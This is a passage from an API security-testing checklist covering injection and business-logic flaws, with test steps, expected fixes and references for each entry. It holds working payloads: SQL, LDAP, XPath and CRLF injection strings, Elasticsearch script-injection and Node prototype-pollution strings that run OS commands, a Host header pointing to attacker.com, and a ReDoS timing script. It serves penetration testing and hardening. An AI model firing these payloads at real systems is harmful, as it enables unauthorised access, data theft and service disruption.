**Test Steps:** 1. Add SQL payload in query parameters<br>2. Try UNION-based extraction<br>3. Check for errors

**Expected Result:** Should use parameterized queries

**Payload / PoC Example:**

```
GET /api/users?name=admin' UNION SELECT password FROM users--
```

**Impact:** DB read/modify, authN bypass, potential RCE via SQL injection

**Tools:** SQLMap

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API8:2023 Security Misconfiguration

---

## API-0277 — SQL Injection in Update
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Update Resource — Request params / JSON body / query filters

**Test Steps:** 1. Update with SQL payload in fields<br>2. Check for errors<br>3. Attempt injection

**Expected Result:** Should use parameterized queries

**Payload / PoC Example:**

```
PUT /posts/1 {"title":"test' OR '1'='1' --"}
```

**Impact:** DB read/modify, authN bypass, potential RCE via SQL injection

**Tools:** SQLMap

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API8:2023 Security Misconfiguration

---

## API-0278 — SQL Injection in Delete
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Delete Resource — Request params / JSON body / query filters

**Test Steps:** 1. Add SQL payload in delete parameter<br>2. Try deleting unintended data<br>3. Check for errors

**Expected Result:** Should use parameterized queries

**Payload / PoC Example:**

```
DELETE /api/posts?id=1' OR '1'='1' --
```

**Impact:** DB read/modify, authN bypass, potential RCE via SQL injection

**Tools:** SQLMap

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API8:2023 Security Misconfiguration

---

## API-0279 — SQL Injection in Search
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Search/Filter — Request params / JSON body / query filters

**Test Steps:** 1. Inject SQL in search query<br>2. Test various SQL payloads<br>3. Attempt data extraction

**Expected Result:** Should use parameterized queries

**Payload / PoC Example:**

```
GET /api/search?q=admin' UNION SELECT password FROM users--
```

**Impact:** DB read/modify, authN bypass, potential RCE via SQL injection

**Tools:** SQLMap

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API8:2023 Security Misconfiguration

---

## API-0280 — NoSQL Injection in Search
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Search/Filter — Request params / JSON body / query filters

**Test Steps:** 1. Test NoSQL operators in search<br>2. Try regex injection<br>3. Check data exposure

**Expected Result:** Should validate and sanitize input

**Payload / PoC Example:**

```
GET /api/search?name[$regex]=.*&price[$gt]=0
```

**Impact:** DB read/modify, authN bypass, potential RCE via SQL injection

**Tools:** Burp Suite

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API8:2023 Security Misconfiguration

---

## API-0281 — LDAP Injection in Search
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Search/Filter — Auth/search fields reaching an LDAP filter

**Test Steps:** 1. Inject LDAP syntax in search<br>2. Try filter bypass<br>3. Enumerate data

**Expected Result:** Should sanitize LDAP queries

**Payload / PoC Example:**

```
q=*)(&(password=*) to bypass
```

**Impact:** LDAP filter injection; authN bypass &amp; directory disclosure

**Tools:** Burp Suite

**References:** -&gt;[LDAP Injection checklist](#/checklist/ldap); OWASP LDAP Injection; PayloadsAllTheThings; PortSwigger; API8:2023 Security Misconfiguration

---

## API-0282 — ReDoS in Search Regex
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Search/Filter — Request params / JSON body / query filters

**Test Steps:** 1. Submit complex regex patterns<br>2. Use catastrophic backtracking patterns<br>3. Monitor response time

**Expected Result:** Should limit regex complexity or timeout

**Payload / PoC Example:**

```
q=(a+)+b with long 'aaa...aaa' string
```

**Impact:** Untrusted input reaches interpreter; data compromise/RCE

**Tools:** Manual

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API4:2023 Unrestricted Resource Consumption

---

## API-0283 — Search Results Filtering Bypass
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Search/Filter — Request params / JSON body / query filters

**Test Steps:** 1. Search for data<br>2. Check if private data appears<br>3. Test access control on results

**Expected Result:** Should filter results based on user permissions

**Payload / PoC Example:**

```
Search returns other users' private data
```

**Impact:** Untrusted input reaches interpreter; data compromise/RCE

**Tools:** Burp Suite

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API1:2023 Broken Object Level Authorization

---

## API-0284 — XSS in Search Query Reflection
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Search/Filter — API request / relevant parameter

**Test Steps:** 1. Submit XSS payload in search<br>2. Check if reflected in response<br>3. Test execution

**Expected Result:** Should encode output

**Payload / PoC Example:**

```
GET /api/search?q=<script>alert(1)</script>
```

**Impact:** Script execution in victim context; session/token theft

**Tools:** Burp Suite

**References:** -&gt;[XSS checklist](#/checklist/xss); PortSwigger Research XSS (Gareth Heyes); OWASP API Top 10; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0285 — Unrestricted Search Result Size
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Search/Filter — Request params / JSON body / query filters

**Test Steps:** 1. Search with broad query<br>2. Request all results without pagination<br>3. Monitor resource usage

**Expected Result:** Should enforce pagination and max results

**Payload / PoC Example:**

```
GET /api/search?q=*&limit=999999
```

**Impact:** Untrusted input reaches interpreter; data compromise/RCE

**Tools:** Burp Suite

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API4:2023 Unrestricted Resource Consumption

---

## API-0286 — Filter Bypass via Parameter Tampering
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Search/Filter — Request params / JSON body / query filters

**Test Steps:** 1. Add filter parameters<br>2. Try to access filtered data<br>3. Test various bypasses

**Expected Result:** Should enforce filters server-side

**Payload / PoC Example:**

```
Add &includeDeleted=true, &includePrivate=true
```

**Impact:** Untrusted input reaches interpreter; data compromise/RCE

**Tools:** Burp Suite

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API1:2023 Broken Object Level Authorization

---

## API-0287 — Host Header Injection
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Host / X-Forwarded-* / custom headers

**Test Steps:** 1. Modify Host header<br>2. Check for cache poisoning<br>3. Test password reset links

**Expected Result:** Should validate Host header against allowlist

**Payload / PoC Example:**

```
Host: attacker.com in password reset request
```

**Impact:** Header/host injection; cache poisoning &amp; routing abuse

**Tools:** Burp Suite

**References:** -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle 'Cracking the Lens' (PortSwigger Research); PortSwigger Academy; API8:2023 Security Misconfiguration

---

## API-0288 — Response Header Injection
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Host / X-Forwarded-* / custom headers

**Test Steps:** 1. Inject CRLF in header values<br>2. Add custom headers<br>3. Test for response splitting

**Expected Result:** Should sanitize header values

**Payload / PoC Example:**

```
HTTP/1.1 200 OK\r\nX-Injected: value
```

**Impact:** Header/host injection; cache poisoning &amp; routing abuse

**Tools:** Burp Suite

**References:** -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle 'Cracking the Lens' (PortSwigger Research); PortSwigger Academy; API8:2023 Security Misconfiguration

---

## API-0289 — Elasticsearch Query Injection
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Search/Filter — Request params / JSON body / query filters

**Test Steps:** 1. Find endpoints using Elasticsearch backend<br>2. Inject ES query DSL: {"query":{"match_all":{}}}<br>3. Try script injection via Groovy/Painless

**Expected Result:** Input validated; user input never injected into ES query DSL directly

**Payload / PoC Example:**

```
GET /api/search?q={"query":{"match_all":{}}}&size=10000
```

**Impact:** Untrusted input reaches interpreter; data compromise/RCE

**Tools:** Burp Suite

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API8:2023 Security Misconfiguration

---

## API-0290 — XPath Injection in Search
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Search/Filter — Fields reaching an XPath query

**Test Steps:** 1. Find XML/SOAP backed search<br>2. Inject: ' or '1'='1<br>3. Try XPath functions: string-length(), doc()<br>4. Attempt data extraction

**Expected Result:** XPath queries use parameterized approach; no user input in query string

**Payload / PoC Example:**

```
GET /api/users?filter=' or '1'='1
GET /api/search?q='] | //user[name/text()!='a
```

**Impact:** XPath injection; authN bypass &amp; XML data extraction

**Tools:** Burp Suite

**References:** -&gt;[XPath Injection checklist](#/checklist/xpath); OWASP XPath Injection; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0291 — CRLF Injection to HTTP Response Splitting
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Host / X-Forwarded-* / custom headers

**Test Steps:** 1. Find reflected input in response headers<br>2. Inject %0d%0a (CRLF)<br>3. Inject new headers or split HTTP response

**Expected Result:** CRLF characters stripped from all header values

**Payload / PoC Example:**

```
GET /api/redirect?url=https://good.com%0d%0aSet-Cookie:%20session=evil%3bhttponly%3dsecure
```

**Impact:** Header/host injection; cache poisoning &amp; routing abuse

**Tools:** Burp Suite

**References:** -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle 'Cracking the Lens' (PortSwigger Research); PortSwigger Academy; API8:2023 Security Misconfiguration

---

## API-0292 — LDAP Injection - Data Extraction
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Auth/search fields reaching an LDAP filter

**Test Steps:** 1. Find LDAP-backed search<br><br>2. Inject LDAP filter to extract data<br><br>3. Enumerate users or attributes<br><br>4. Access sensitive directory data

**Expected Result:** Should sanitize LDAP special characters

**Payload / PoC Example:**

```
search=*)(objectClass=*
```

**Impact:** LDAP filter injection; authN bypass &amp; directory disclosure

**Tools:** Burp Suite

**References:** -&gt;[LDAP Injection checklist](#/checklist/ldap); OWASP LDAP Injection; PayloadsAllTheThings; PortSwigger; API8:2023 Security Misconfiguration

---

## API-0293 — XPath Injection
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Fields reaching an XPath query

**Test Steps:** 1. Find XML/XPath-backed query<br><br>2. Inject XPath syntax<br><br>3. Bypass authentication or extract data<br><br>4. Access unauthorized information

**Expected Result:** Should use parameterized XPath queries

**Payload / PoC Example:**

```
username=' or '1'='1
```

**Impact:** XPath injection; authN bypass &amp; XML data extraction

**Tools:** Burp Suite

**References:** -&gt;[XPath Injection checklist](#/checklist/xpath); OWASP XPath Injection; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0294 — Expression Language Injection
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Request params / JSON body / query filters

**Test Steps:** 1. Find EL-evaluated parameter<br><br>2. Inject EL expressions<br><br>3. Access application objects<br><br>4. Achieve code execution

**Expected Result:** Should not evaluate user input as EL

**Payload / PoC Example:**

```
${applicationScope} or #{request.getClass()}
```

**Impact:** Untrusted input reaches interpreter; data compromise/RCE

**Tools:** Burp Suite

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API8:2023 Security Misconfiguration

---

## API-0295 — Header Injection - CRLF
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Host / X-Forwarded-* / custom headers

**Test Steps:** 1. Find parameter reflected in headers<br><br>2. Inject CRLF characters<br><br>3. Add malicious headers<br><br>4. Achieve response splitting

**Expected Result:** Should sanitize CRLF in header values

**Payload / PoC Example:**

```
param=value%0d%0aX-Injected:header
```

**Impact:** Header/host injection; cache poisoning &amp; routing abuse

**Tools:** Burp Suite

**References:** -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle 'Cracking the Lens' (PortSwigger Research); PortSwigger Academy; API8:2023 Security Misconfiguration

---

## API-0296 — Header Injection - Host Header
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Host / X-Forwarded-* / custom headers

**Test Steps:** 1. Modify Host header<br><br>2. Check if used in responses or links<br><br>3. Poison password reset links<br><br>4. Cache poisoning

**Expected Result:** Should not trust Host header for generating URLs

**Payload / PoC Example:**

```
Host: attacker.com
```

**Impact:** Header/host injection; cache poisoning &amp; routing abuse

**Tools:** Burp Suite

**References:** -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle 'Cracking the Lens' (PortSwigger Research); PortSwigger Academy; API8:2023 Security Misconfiguration

---

## API-0297 — Log Injection
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Request params / JSON body / query filters

**Test Steps:** 1. Find parameter logged by application<br><br>2. Inject fake log entries<br><br>3. Include CRLF for new log lines<br><br>4. Forge audit trail

**Expected Result:** Should sanitize log input

**Payload / PoC Example:**

```
input=Success%0a[INFO] Admin logged in
```

**Impact:** Untrusted input reaches interpreter; data compromise/RCE

**Tools:** Burp Suite

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API8:2023 Security Misconfiguration

---

## API-0298 — Elasticsearch Query DSL Injection
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET Search/Filter — Request params / JSON body / query filters

**Test Steps:** 1. Find endpoints using Elasticsearch<br>2. Inject ES query DSL via search params<br>3. Try script injection via Painless/Groovy<br>4. Attempt to bypass filters and dump all records

**Expected Result:** User input never injected into ES query DSL; parameterized ES queries only

**Payload / PoC Example:**

```
# Basic filter bypass
GET /api/search?q={"query":{"match_all":{}}}
GET /api/search?filter={"bool":{"must":[]}}

# Dump all documents
GET /api/search?q=*&size=10000&from=0
POST /api/search {"query":{"match_all":{}},"size":10000}

# Painless script injection (RCE on old ES)
POST /api/search
{"query":{"function_score":{"query":{"match_all":{}},"functions":[{"script_score":{"script":{"lang":"painless","source":"int x = Integer.parseInt('1'); Runtime rt = Runtime.getRuntime(); String[] commands = new String[]{'/bin/sh','-c','id'}; Process proc = rt.exec(commands); return x;"}}}]}}}

# Groovy injection (ES < 1.6)
POST /api/search {"query":{"filtered":{"query":{"match_all":{}},"filter":{"script":{"script":"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next();"}}}}}
```

**Impact:** Untrusted input reaches interpreter; data compromise/RCE

**Tools:** Burp Suite, ElasticSearch

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API8:2023 Security Misconfiguration

---

## API-0299 — ReDoS via Complex Regex in Search
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET Search/Filter — Request params / JSON body / query filters

**Test Steps:** 1. Submit catastrophic backtracking regex patterns<br>2. Monitor response time (&gt;30s = vulnerable)<br>3. Chain with parallel requests for DoS

**Expected Result:** Server-side regex has timeout enforced; user-controlled regex not permitted

**Payload / PoC Example:**

```
# Catastrophic backtracking patterns
GET /api/search?q=(a+)+$aaaaaaaaaaaaaaaaaaaaX
GET /api/search?q=(a|aa)+$aaaaaaaaaaaaaaaaaaaaX
GET /api/search?q=([a-zA-Z]+)*aaaaaaaaX
GET /api/search?q=(a+){20}b

# Email validation ReDoS
email=a@a.aaaaaaaaaaaaaaaaaaaaaaaa!

# Python PoC
import requests, time
payload = "a" * 30 + "X"
pattern = f"({payload})+"
start = time.time()
r = requests.get(f"/api/search?q={pattern}")
print(f"Response time: {time.time()-start:.2f}s")  # Should be >30s if vulnerable
```

**Impact:** Untrusted input reaches interpreter; data compromise/RCE

**Tools:** Python, Burp Suite

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API8:2023 Security Misconfiguration

---

## API-0300 — Server-Side Parameter Pollution (SSPP) into an internal API
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API10:2023 Unsafe Consumption of APIs · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** User input reflected into a server-built internal REST/GraphQL query string

**Test Steps:** 1. Find a param the server forwards into an internal API call<br>2. Inject #, &amp;, = to truncate/append internal params (e.g. &amp;admin=true)<br>3. Observe changed internal behavior<br>4. Confirm you overrode a server-side parameter

**Expected Result:** Server URL-encodes user input before composing upstream requests

**Payload / PoC Example:**

```
GET /api/v1/lookup?user=alice%23   |   ?user=alice%26role%3Dadmin
```

**Impact:** SSPP -&gt; override internal API params -&gt; authz bypass / unauthorized data access

**Tools:** Burp Suite

**References:** PortSwigger Academy: Server-side parameter pollution; OWASP API10; API10:2023 Unsafe Consumption of APIs

---

## API-0301 — Server-side prototype pollution via JSON API body (__proto__)
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** JSON body deep-merged server-side (Node.js) — __proto__ / constructor keys

**Test Steps:** 1. Send __proto__ / constructor.prototype keys in a JSON body that gets deep-merged<br>2. Pollute a property (e.g. isAdmin, or an app-read gadget)<br>3. Re-request; confirm the polluted default took effect (authz bypass / DoS)<br>4. If a known gadget exists, chain to RCE (Node)

**Expected Result:** Server rejects/strips __proto__/constructor; no unsafe recursive merge

**Payload / PoC Example:**

```
{"__proto__":{"isAdmin":true}}   |   {"constructor":{"prototype":{"role":"admin"}}}
```

**Impact:** Server-side prototype pollution -&gt; authz bypass, DoS, or RCE gadget

**Tools:** Burp Suite, PPScan

**References:** -&gt;[Prototype Pollution checklist](#/checklist/prototype); Olivier Arteau (NorthSec); PortSwigger server-side PP research; OWASP API8; API8:2023 Security Misconfiguration

---

## API-0302 — Server-side prototype pollution (Node.js)
**Phase:** 7-Injection · **Category:** Prototype Pollution · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST JSON body keys (__proto__ / constructor / prototype)

**Test Steps:** 1. Send {"__proto__":{"isAdmin":true}}<br>2. Or {"constructor":{"prototype":{...}}}<br>3. Test endpoints that merge/clone JSON

**Expected Result:** Block __proto__ keys; use Object.create(null)

**Payload / PoC Example:**

```
{"__proto__":{"isAdmin":true}}
```

**Impact:** Auth bypass / RCE chain

**Tools:** ppfuzz,Burp Server-Side PP scanner

**References:** -&gt;[Prototype Pollution checklist](#/checklist/prototype); Olivier Arteau NorthSec; PortSwigger server-side PP research; HackTricks; API8:2023 Security Misconfiguration

---

## API-0303 — Prototype Pollution via JSON API
**Phase:** 7-Injection · **Category:** Prototype Pollution · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** JSON body keys (__proto__ / constructor / prototype)

**Test Steps:** 1. Inject __proto__ in JSON body<br>2. Try constructor.prototype manipulation<br>3. Check if server-side JavaScript affected

**Expected Result:** JSON parsing strips dangerous keys; prototype pollution mitigated

**Payload / PoC Example:**

```
POST /api/config {"__proto__":{"isAdmin":true}}
POST /api/data {"constructor":{"prototype":{"polluted":true}}}
```

**Impact:** Prototype pollution escalating to DoS/RCE/authz bypass

**Tools:** Burp Suite

**References:** -&gt;[Prototype Pollution checklist](#/checklist/prototype); Olivier Arteau NorthSec; PortSwigger server-side PP research; HackTricks; API8:2023 Security Misconfiguration

---

## API-0304 — Server-Side Prototype Pollution to RCE
**Phase:** 7-Injection · **Category:** Prototype Pollution · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** JSON body keys (__proto__ / constructor / prototype)

**Test Steps:** 1. Inject __proto__.env or __proto__.execArgv in JSON<br>2. Check if node process inherits polluted property<br>3. Escalate to RCE via child_process

**Expected Result:** Server sanitizes prototype pollution; uses safe merge libraries

**Payload / PoC Example:**

```
POST /api/merge {"__proto__":{"execArgv":["--eval","require('child_process').exec('id',console.log)"]}}
{"__proto__":{"NODE_OPTIONS":"--require /proc/self/fd/0"}}
```

**Impact:** Prototype pollution escalating to DoS/RCE/authz bypass

**Tools:** Burp Suite

**References:** -&gt;[Prototype Pollution checklist](#/checklist/prototype); Olivier Arteau NorthSec; PortSwigger server-side PP research; HackTricks; API8:2023 Security Misconfiguration

---

## API-0305 — Unicode normalization bypass
**Phase:** 7-Injection · **Category:** Security Misconfiguration · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** POST Server config / response headers / defaults

**Test Steps:** 1. Replace ASCII with homoglyph (Cyrillic А for A)<br>2. Use punycode email<br>3. Test case-folding (Turkish I)

**Expected Result:** Normalize to NFKC before compare

**Payload / PoC Example:**

```
Аdmin@target.com (Cyrillic А)
```

**Impact:** Account takeover via collision

**Tools:** Manual

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0306 — Price/quantity manipulation
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Intercept checkout<br>2. Set negative qty / 0.01 price / huge int / decimal precision<br>3. Complete order

**Expected Result:** Validate ranges and recompute price server-side

**Payload / PoC Example:**

```
{"quantity":-5,"price":0.01}
```

**Impact:** Direct financial loss

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0307 — Workflow step skipping
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Map multi-step flow (cart -&gt; pay -&gt; ship)<br>2. Skip /pay; call /ship directly<br>3. Verify shipped without payment

**Expected Result:** Server enforces state machine

**Payload / PoC Example:**

```
POST /ship without /pay
```

**Impact:** Free goods / fraud

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0308 — Business Logic Bypass - Create for Others
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Create Resource — Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Create resource<br>2. Set userId to different user<br>3. Check ownership

**Expected Result:** Should only create for authenticated user

**Payload / PoC Example:**

```
POST /posts {"userId":2} while logged as user 1
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0309 — Negative Value Injection
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Create Resource — Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Create resource with negative values<br>2. Check if accepted<br>3. Verify business logic impact

**Expected Result:** Should validate value ranges

**Payload / PoC Example:**

```
POST /order {"quantity": -5, "price": -100}
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0310 — Business Logic - Price Manipulation
